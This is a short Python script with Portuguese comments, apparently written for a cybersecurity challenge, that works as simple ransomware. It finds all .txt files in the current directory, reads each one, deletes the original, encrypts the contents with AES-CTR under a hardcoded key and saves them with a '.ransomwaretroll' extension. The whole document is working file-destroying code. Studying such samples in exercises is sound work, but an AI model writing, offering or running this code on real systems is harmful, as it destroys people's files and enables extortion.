## codigo criptografia de arquivos txt - desafio ciberseguranca

## importacoes
import os
import pyaes
## definicao de variaveis
lista_arquivos = os.listdir('.')
arquivos_txt = []
## chave de criptografia
chave = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(chave)
## buscar arquivos txt
def busca_txt(lista_arquivos):
	for arquivo in lista_arquivos:
		if ".txt" in arquivo:
			arquivos_txt.append(arquivo)
	return arquivos_txt
## ataque
def ataque ():
	for txt in arquivos_txt:
		## abrir arquivo
		file = open(txt, "rb")
		## gravar conteudo
		file_data = file.read()
		file.close()
		## remover arquivo
		os.remove(txt)
		## criptografar arquivo
		crypto_data = aes.encrypt(file_data)
		## salvar arquivo criptografado
		new_file = txt + ".ransomwaretroll"
		new_file = open(f'{new_file}','wb')
		new_file.write(crypto_data)
		new_file.close()
## ponto de entrada
if __name__ == "__main__":
	arquivos_txt = busca_txt(lista_arquivos)
	ataque ()
